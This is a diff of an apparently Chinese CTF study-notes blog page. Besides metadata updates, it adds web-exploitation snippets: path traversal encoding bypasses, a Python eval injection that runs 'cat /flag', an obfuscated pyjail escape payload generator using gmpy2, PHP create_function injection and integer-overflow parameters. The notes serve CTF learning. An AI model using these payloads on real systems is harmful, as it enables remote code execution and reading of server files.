@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://sec-cat.github.io/img/ctfshowblog/ctf.jpg">
 <meta property="article:published_time" content="2023-05-08T13:37:40.000Z">
-<meta property="article:modified_time" content="2023-05-26T06:23:41.689Z">
+<meta property="article:modified_time" content="2023-05-26T12:23:51.633Z">
 <meta property="article:author" content="cat">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="php">
@@ -241,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          8.4k 字
+          9.5k 字
         
       </span>
     
@@ -252,7 +252,7 @@
         
         
         
-          36 分钟
+          40 分钟
         
       </span>
     
@@ -383,7 +383,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2 小时前
+                    本文最后更新于：31 分钟前
                   
                 
               </p>
@@ -435,6 +435,18 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=\create_function&amp;b=<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;1&#x27;</span>;&#125;var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));/*<br>a=\create_function&amp;b=<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;1&#x27;</span>;&#125;var_dump(file_get_contents(<span class="hljs-string">&#x27;/flag&#x27;</span>));/*<br></code></pre></td></tr></table></figure>
 <h2 id="os-path-join-函数">os.path.join()函数</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">第一个以<span class="hljs-string">&quot;/&quot;</span>开头的参数开始拼接，之前的参数全部丢弃,当有多个时，从最后一个开始<br>$ <span class="hljs-built_in">print</span>(os.path.join(<span class="hljs-string">&quot;a/&quot;</span>,<span class="hljs-string">&quot;/b&quot;</span>,<span class="hljs-string">&quot;/c/d&quot;</span>))<br>$ /c/d<br></code></pre></td></tr></table></figure>
+<h2 id="目录穿越">目录穿越</h2>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">URL编码绕过<br>.   =&gt;  <span class="hljs-comment">%2e</span><br>/   =&gt;  <span class="hljs-comment">%2f</span><br><span class="hljs-comment">%   =&gt;  %25  (双重URL编码)</span><br><br>某些web对filename的文件类型作了限制，例如只有当后缀为图片时才解析<br><span class="hljs-comment">%00 来截断</span><br></code></pre></td></tr></table></figure>
+<h2 id="assert与intval">assert与intval</h2>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span>val可执行运算，思路：配合+-在assert中的绕过<br></code></pre></td></tr></table></figure>
+<h2 id="eval计算器">eval计算器</h2>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">_calculate?<span class="hljs-symbol">number1</span>=<span class="hljs-number">1</span>&amp;operator=<span class="hljs-meta">%</span><span class="hljs-number">2</span>B&amp;<span class="hljs-symbol">number2</span>=<span class="hljs-number">2</span>,__import__<span class="hljs-comment">(&#x27;os&#x27;)</span>.system<span class="hljs-comment">(&#x27;cat /flag &gt;/app/templates/hint.html&#x27;)</span><br></code></pre></td></tr></table></figure>
+<h2 id="pyjail沙箱逃逸">pyjail沙箱逃逸</h2>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros">exp<br><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span><br><br>import gmpy2<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/&#x27;(). &quot;</span>:<br>                <span class="hljs-attribute">temp_index</span>=0<br>                <span class="hljs-attribute">temp_string</span>=<span class="hljs-string">&#x27;x&#x27;</span>*20<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dir(gmpy2):<br>                        <span class="hljs-keyword">if</span> j.<span class="hljs-built_in">find</span>(i)&gt;=0:<br>                                <span class="hljs-keyword">if</span> len(j)&lt;len(temp_string):<br>                                        <span class="hljs-attribute">temp_string</span>=j<br>                                        <span class="hljs-attribute">temp_index</span>=j.find(i)<br>                payload+=f<span class="hljs-string">&#x27;\&#x27;</span>&#123;temp_string&#125;\<span class="hljs-string">&#x27;[&#123;temp_index&#125;]+&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>                payload+=f<span class="hljs-string">&#x27;\&quot;&#123;i&#125;\&quot;+&#x27;</span><br><br><span class="hljs-attribute">payload</span>=payload[:-1]+<span class="hljs-string">&#x27;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(payload)<br><br></code></pre></td></tr></table></figure>
+<h2 id="php整型溢出">php整型溢出</h2>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=<span class="hljs-number">152000</span>&amp;b=<span class="hljs-number">0</span>&amp;c=<span class="hljs-number">0</span>&amp;d=<span class="hljs-number">0</span>&amp;e=<span class="hljs-number">922337203685477580</span><br></code></pre></td></tr></table></figure>
+<h2 id="数组-永真">数组&quot;永真&quot;</h2>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">数组整型溢出绕过赋值式“永真”判断：<br>?<span class="hljs-attribute">a</span>=9223372036854775807<br></code></pre></td></tr></table></figure>
                 
               </div>
             
